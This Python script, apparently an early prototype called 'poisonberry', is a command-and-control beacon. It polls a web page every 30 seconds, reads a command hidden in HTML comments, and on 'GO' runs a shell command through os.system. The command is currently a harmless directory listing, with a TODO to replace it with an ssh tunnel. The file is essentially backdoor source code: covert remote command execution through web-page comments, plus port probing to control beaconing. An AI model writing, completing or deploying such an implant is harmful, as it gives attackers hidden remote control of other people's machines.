import urllib.request
import urllib.parse
import time
import socket
import bs4
import os
import sys
from bs4 import BeautifulSoup, Comment


class poisonberry:

    def __init__(self):
        self.endpoint = {}
        self.beacon = True
        self.data= {}
        self.command={}
        self.run={}
        self.port={}

    def start(self):
        while True:
            while self.beacon == True:
                self.GET()
                self.tryPort()
                time.sleep(30)

    def tryPort(self):
        self.port=2222
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = False
        try:
            sock.bind(("0.0.0.0", self.port))
            print("port is free")
            self.beacon = True
            result = True
        except:
            print("Port is in use")
            self.beacon = False
        sock.close()
        return result


    def GET(self):
         self.handle_request()


    def stop(self):
        try:
            print("DONE")
        except:
            print( "the fuck")


    def handle_request(self):
        self.endpoint = "http://localhost:8000/site.html"
        self.data = urllib.request.urlopen(self.endpoint)

        self.parse_response()

    def parse_response(self):
        self.data=self.data.read().decode('utf-8')
        print(self.data)

        soup = BeautifulSoup(self.data, 'lxml')

        comments = soup.findAll(text=lambda text:isinstance(text, Comment))
       # print(type(comments))
       # print(comments)
        self.command = str(comments).split(":",1)[1][:-3]
        print(self.command)
        self.process_command()

    def process_command(self):
        print(self.command)
        if self.command != "GO":
            print("chicken")
        else:
            cmd = 'ls -la >out.txt' #TODO replace with ssh tunnel
            print(cmd)
            if self.run!= 1:# TODO not this, we need a better way to not run a command multiple times when run
                os.system(cmd)
                self.run =1
                self.beacon = False
            else:
                print("running")
c=poisonberry()

c.start()
#c.GET()

